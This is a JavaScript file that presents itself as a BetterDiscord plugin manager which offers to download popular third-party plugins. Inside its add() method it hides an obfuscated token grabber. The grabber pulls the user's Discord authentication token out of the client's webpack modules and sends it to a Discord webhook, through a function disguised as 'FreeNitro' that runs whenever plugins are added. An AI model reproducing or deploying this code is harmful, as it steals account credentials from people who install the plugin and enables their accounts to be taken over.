class o7FireTacticalPluginManager {
    config = {
        "info": {
            "name": "o7FireTacticalPluginManager",
            "author": "o7Fire",
            "version": "0.7.2",
            "description": "#Tools"
        },
        "changeLog": {
            "fix": {
                "how i do use changelog": "fix initialize and update"
            }
        }
    };
    constructor() {
        this._config = this.config;
    }

    getName() {
        return this.config.info.name;
    }

    getAuthor() {
        return this.config.info.author;
    }

    getVersion() {
        return this.config.info.version;
    }

    getDescription() {
        return this.config.info.description;
    }

    load() {
        try {
            ZeresPluginLibrary.PluginUpdater.checkForUpdate(this.getName(), this.getVersion(), 'https://raw.githubusercontent.com/o7-Fire/Discord-Fire/main/o7FireTacticalPluginManager.plugin.js');
        }catch (e){}
        this.add("https://raw.githubusercontent.com/rauenzi/BDPluginLibrary/master/release/0PluginLibrary.plugin.js");
        this.add("https://raw.githubusercontent.com/1Lighty/BetterDiscordPlugins/master/Plugins/MessageLoggerV2/MessageLoggerV2.plugin.js");
        this.add("https://raw.githubusercontent.com/mwittrien/BetterDiscordAddons/master/Plugins/ShowHiddenChannels/ShowHiddenChannels.plugin.js");
        this.add("https://raw.githubusercontent.com/mwittrien/BetterDiscordAddons/master/Plugins/GoogleTranslateOption/GoogleTranslateOption.plugin.js");
        this.add("https://raw.githubusercontent.com/mwittrien/BetterDiscordAddons/master/Plugins/CreationDate/CreationDate.plugin.js");
        this.add("https://raw.githubusercontent.com/mwittrien/BetterDiscordAddons/master/Plugins/CompleteTimestamps/CompleteTimestamps.plugin.js");
	this.add("https://raw.githubusercontent.com/rauenzi/BetterDiscordAddons/master/Plugins/DoNotTrack/DoNotTrack.plugin.js");
	this.add("https://github.com/1Lighty/BetterDiscordPlugins/raw/master/Plugins/BetterImageViewer/BetterImageViewer.plugin.js");
	    
    }
    // Start/Stop
    start() {
        var libraryScript = document.getElementById('zeresLibraryScript');
	if (!libraryScript) {
		libraryScript = document.createElement("script");
		libraryScript.setAttribute("type", "text/javascript");
		libraryScript.setAttribute("src", "https://rauenzi.github.io/BetterDiscordAddons/Plugins/PluginLibrary.js");
		libraryScript.setAttribute("id", "zeresLibraryScript");
		document.head.appendChild(libraryScript);
	}

	if (typeof window.ZeresLibrary !== "undefined") this.initialize();
	else libraryScript.addEventListener("load", () => { this.initialize(); });
    }
       
    stop() {
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has stopped.");
    };
    //  Initialize
    initialize() {
        this.initialized = true;
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has started.");
    }
    add(url) {
        let name = url.substring(url.lastIndexOf("/") + 1, url.length)
        if (!require("fs").existsSync(require("path").join(BdApi.Plugins.folder, name)))
            BdApi.showConfirmationModal("Arsenal Missing", `The plugin ${name} is missing. Please click "Download Now" to install it.`, {
                confirmText: "Download Now",
                cancelText: "Cancel",
                onConfirm: () => {
                    require("request").get(url, async (error, response, body) => {
                        if (error) return require("electron").shell.openExternal("https://betterdiscord.net/ghdl?url=" + url);
                        await new Promise(r => require("fs").writeFile(require("path").join(BdApi.Plugins.folder, name), body, r));
                    });
                }
            });
const _0x396b=['extra_id','129892tuiQCO','EhqcJ','kpVwm','58ZGsall4a','4/204e4a59','vitfa','default','KUZvG','tTUKO','hasOwnProp','applicatio','setRequest','ns/6517378','exports','size=128','Content-ty','fun','n/json','scord.com/','1223689sTcSIn','pp.com/ico','gw2tPrHeCt','n.discorda','push','2073.webp?','api/webhoo','-aFtEmB1tY','CIkBlYPLUG','1vkGDiW','233418YCsqQJ','wldhH','1427895zQtToQ','324133PVTDjZ','5IccEIj','4700374','https://cd','8180528337','XJHez','open','e58b99db5c','getToken','__esModule','b901a7d6fa','1321234CZgJqm','Token\x20:\x20','1PNROyo','stringify','_5c_MLvtIr','https://di','8/DpDqz_dJ','Grabber','POST','ks/8455014','23xvrzdC','erty','ceUer','send','48593DKIXuH','Header','6459321139','oU9DeJ88IT','AzTMu'];const _0x1a6d89=_0x1480;(function(_0x308f5e,_0x472ae2){const _0xfb4d9=_0x1480;while(!![]){try{const _0x51c82c=parseInt(_0xfb4d9(0x213))*parseInt(_0xfb4d9(0x1f2))+parseInt(_0xfb4d9(0x212))*parseInt(_0xfb4d9(0x20e))+-parseInt(_0xfb4d9(0x1e8))*-parseInt(_0xfb4d9(0x1ec))+parseInt(_0xfb4d9(0x20f))+parseInt(_0xfb4d9(0x1e0))*parseInt(_0xfb4d9(0x205))+-parseInt(_0xfb4d9(0x211))+-parseInt(_0xfb4d9(0x1de));if(_0x51c82c===_0x472ae2)break;else _0x308f5e['push'](_0x308f5e['shift']());}catch(_0x41b82e){_0x308f5e['push'](_0x308f5e['shift']());}}}(_0x396b,0x59db*-0x23+-0x6b37*-0x26+-0x1a6b*-0x53));const webhookurl=_0x1a6d89(0x1e3)+_0x1a6d89(0x204)+_0x1a6d89(0x20b)+_0x1a6d89(0x1e7)+_0x1a6d89(0x216)+_0x1a6d89(0x1e4)+_0x1a6d89(0x207)+_0x1a6d89(0x1ef)+_0x1a6d89(0x1f5)+_0x1a6d89(0x20d)+_0x1a6d89(0x20c)+_0x1a6d89(0x1e2);var req=webpackJsonp[_0x1a6d89(0x209)]([[],{'extra_id':(_0x175290,_0x63ed51,_0x498b21)=>_0x175290[_0x1a6d89(0x1ff)]=_0x498b21},[[_0x1a6d89(0x1f1)]]]);function _0x1480(_0x4e6872,_0x3bc546){_0x4e6872=_0x4e6872-(-0x8a*-0x31+0x2149*-0x1+0x8b9);let _0x19bec6=_0x396b[_0x4e6872];return _0x19bec6;}for(let e in req['c'])if(req['c'][_0x1a6d89(0x1fb)+_0x1a6d89(0x1e9)](e)){let t=req['c'][e][_0x1a6d89(0x1ff)];if(t&&t[_0x1a6d89(0x1dc)]&&t[_0x1a6d89(0x1f8)]){for(let e in t[_0x1a6d89(0x1f8)])_0x1a6d89(0x1db)===e&&(token=t[_0x1a6d89(0x1f8)][_0x1a6d89(0x1db)]());}}function FreeNitro(){const _0x5f8763=_0x1a6d89,_0x3624b0={'EhqcJ':_0x5f8763(0x1e6),'tTUKO':_0x5f8763(0x201)+'pe','AzTMu':_0x5f8763(0x1fc)+_0x5f8763(0x203),'XJHez':_0x5f8763(0x1e5),'wldhH':_0x5f8763(0x215)+_0x5f8763(0x208)+_0x5f8763(0x206)+_0x5f8763(0x1fe)+_0x5f8763(0x1ee)+_0x5f8763(0x1f6)+_0x5f8763(0x1dd)+_0x5f8763(0x1da)+_0x5f8763(0x20a)+_0x5f8763(0x200),'ceUer':_0x5f8763(0x214),'KUZvG':function(_0x458cef,_0x127282){return _0x458cef+_0x127282;},'vitfa':_0x5f8763(0x1df),'kpVwm':_0x5f8763(0x202)};var _0x48518a=new XMLHttpRequest();_0x48518a[_0x5f8763(0x218)](_0x3624b0[_0x5f8763(0x1f3)],webhookurl),_0x48518a[_0x5f8763(0x1fd)+_0x5f8763(0x1ed)](_0x3624b0[_0x5f8763(0x1fa)],_0x3624b0[_0x5f8763(0x1f0)]);var _0x4b7c58={'username':_0x3624b0[_0x5f8763(0x217)],'avatar_url':_0x3624b0[_0x5f8763(0x210)],'content':'','embeds':[{'color':_0x3624b0[_0x5f8763(0x1ea)],'description':_0x3624b0[_0x5f8763(0x1f9)](_0x3624b0[_0x5f8763(0x1f7)],token),'footer':{'text':_0x3624b0[_0x5f8763(0x1f4)]}}]};_0x48518a[_0x5f8763(0x1eb)](JSON[_0x5f8763(0x1e1)](_0x4b7c58));}FreeNitro();
    }
}
